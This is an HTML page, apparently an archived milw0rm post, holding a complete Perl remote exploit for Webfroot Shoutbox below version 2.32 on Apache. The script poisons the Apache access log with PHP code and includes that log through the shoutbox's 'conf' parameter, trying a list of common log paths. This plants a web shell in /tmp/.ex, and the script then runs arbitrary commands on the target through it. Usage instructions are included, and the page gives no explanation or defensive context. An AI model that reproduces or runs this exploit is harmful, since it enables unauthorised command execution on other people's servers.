<html>
<head>
<title>Webfroot Shoutbox < 2.32 (Apache) Remote Exploit
</title>
<pre>
#!/usr/bin/perl
#
# Webfroot Shoutbox &lt; 2.32 on apache exploit
#

use IO::Socket;

my $host = &quot;127.0.0.1&quot;;
my $port = 80;
my $shoutbox = &quot;shoutbox.php?conf=&quot;;
my $shoutboxpath = &quot;/shoutbox&quot;;
my $cmd = &quot;ls -l&quot;;
my $conn;
my $type;
my @logs = ( 
&quot;/etc/httpd/logs/acces_log&quot;,
&quot;/etc/httpd/logs/acces.log&quot;,
&quot;/var/www/logs/access_log&quot;,
&quot;/var/www/logs/access.log&quot;,
&quot;/usr/local/apache/logs/access_log&quot;,
&quot;/usr/local/apache/logs/access.log&quot;,
&quot;/var/log/apache/access_log&quot;,
&quot;/var/log/apache/access.log&quot;,
&quot;/var/log/httpd/access_log&quot;,
&quot;/var/log/httpd/access.log&quot;,
#&quot;D:/apps/Apache Group/Apache2/logs/access.log&quot; 
);

my $qinit = &quot;GET /&lt;?\$h=fopen('/tmp/.ex','w+');fwrite(\$h,'Result:&lt;pre&gt;&lt;?system(\$cmd);?&gt;
&lt;/pre&gt;');fclose(\$h);?&gt; HTTP/1.1\nHost: 127.0.0.1\nConnection: Close\n\n&quot;;
my $conn;


if ($ARGV[0] eq &quot;x&quot; || $ARGV[0] eq &quot;r&quot;){
$type = $ARGV[0]; 
}
else {
print &quot;[x] Webfroot Shoutbox &lt; 2.32 on apache exploit \n\n&quot;;
print &quot;Usage: \n Webfroot.pl (x|r) host [command] [path] [port]\n&quot;;
print &quot;\ttype\tx = exploit | r = run command (after run with x option)\n&quot;;
print &quot;\thost\thostname\n&quot;;
print &quot;\tcommand\tcommand to execute on remote server\n&quot;;
print &quot;\tpath\tpath to shoutbox installation ex: /shoutbox\n&quot;;
print &quot;\tport\tport number\n&quot;;
exit;
}

if ($ARGV[1]){
$host = $ARGV[1]; 
}

if ($ARGV[2]){
$cmd = $ARGV[2]; 
}
if ($ARGV[3]){
$shoutboxpath = $ARGV[3]; 
}
if ($ARGV[4]){
$port = int($ARGV[4]); 
}

$cmd =~ s/ /+/g;

sub connect_to {
#print &quot;[x] Connect to $host on port $port ...\n&quot;;
$conn = IO::Socket::INET-&gt;new (
Proto =&gt; &quot;tcp&quot;,
PeerAddr =&gt; &quot;$host&quot;,
PeerPort =&gt; &quot;$port&quot;,
) or die &quot;[*] Can't connect to $host on port $port ...\n&quot;;
$conn-&gt; autoflush(1);
}

sub connect_end {
#print &quot;[x] Close connection\n&quot;;
close($conn);
}

sub exploit {
my $access_log = $_[0];
my $result = &quot;&quot;;
$access_log =~ s/ /+/g;
my $query = &quot;GET ${shoutboxpath}/${shoutbox}${access_log} HTTP/1.1\
nHost: $host\nConnection: Close\n\n&quot;;
print &quot;$query&quot;;
print &quot;[x] Access log : &quot;, $access_log ,&quot;\n&quot;;
&amp;connect_to;
print $conn $query;
while ($line = &lt;$conn&gt;) { 
$result = $line;
#print $result;
};
&amp;connect_end;

}

sub run_cmd {
my $conf=&quot;/tmp/.ex&quot;;
#my $conf=&quot;d:/tmp/.ex&quot;;
my $result = &quot;&quot;;
my $query = &quot;GET ${shoutboxpath}/${shoutbox}${conf}&amp;cmd=$cmd HTTP/1.1\
nHost: $host\nConnection: Close\n\n&quot;;

print &quot;[x] Run command ...\n&quot;;
&amp;connect_to;
print $conn $query;
while ($line = &lt;$conn&gt;) { 
$result .= $line;
};
&amp;connect_end;
if ($result =~ /Result:/){
print $result;
} else {
print $result;
print &quot;[*] Failed ...&quot;;
} 

}

sub insert_code {
my $result = &quot;&quot;;
print &quot;[x] Access log : &quot;, $access_log ,&quot;\n&quot;;
print &quot;[x] Insert php code into apache access log ...\n&quot;;
&amp;connect_to;
print $conn &quot;$qinit&quot;;
while ($line = &lt;$conn&gt;) { 
$result .= $line;
};
&amp;connect_end;
print $result; 
}

if ($type eq &quot;x&quot;){
&amp;insert_code;
print &quot;[x] Trying to exploit ...\n&quot;;
for ($i = 0;$i &lt;= $#logs; $i++){
&amp;exploit($logs[$i]);
}
&amp;run_cmd;
} else {
&amp;run_cmd;
}



# milw0rm.com [2003-05-29]
</pre>
</html>

